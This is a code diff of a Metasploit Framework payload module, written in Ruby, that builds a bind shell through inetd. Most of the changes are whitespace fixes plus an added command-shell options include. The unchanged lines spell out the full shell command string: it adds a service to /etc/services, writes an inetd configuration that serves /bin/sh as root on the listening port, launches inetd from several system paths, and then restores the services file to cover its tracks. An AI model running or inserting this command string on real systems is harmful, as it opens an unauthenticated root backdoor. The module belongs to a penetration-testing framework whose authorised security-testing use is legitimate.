@@ -3,21 +3,21 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
-
+require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
 	include Msf::Payload::Single
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
@@ -47,7 +47,7 @@ module Metasploit3
 	def generate
 		return super + command_string
 	end
-	
+
 	#
 	# Returns the command string to use for execution
 	#
@@ -59,22 +59,22 @@ module Metasploit3
 		cmd =
 			# Create a clean copy of the services file
 			"cp /etc/services #{tmp_services};" +
-			
+
 			# Add our service to the system one
 			"echo #{svc} #{datastore['LPORT']}/tcp>>/etc/services;" +
-			
+
 			# Create our inetd configuration file with our service
 			"echo #{svc} stream tcp nowait root /bin/sh sh>#{tmp_inet};" +
-			
+
 			# First we try executing inetd without the full path
 			"inetd -s #{tmp_inet} ||" +
-			
+
 			# Next try the standard inetd path on Linux, Solaris, BSD
 			"/usr/sbin/inetd -s #{tmp_inet} ||" +
-			
+
 			# Next try the Irix inetd path
 			"/usr/etc/inetd -s #{tmp_inet};" +
-			
+
 			# Overwrite services with the "clean" version
 			"cp #{tmp_services} /etc/services;" +
 
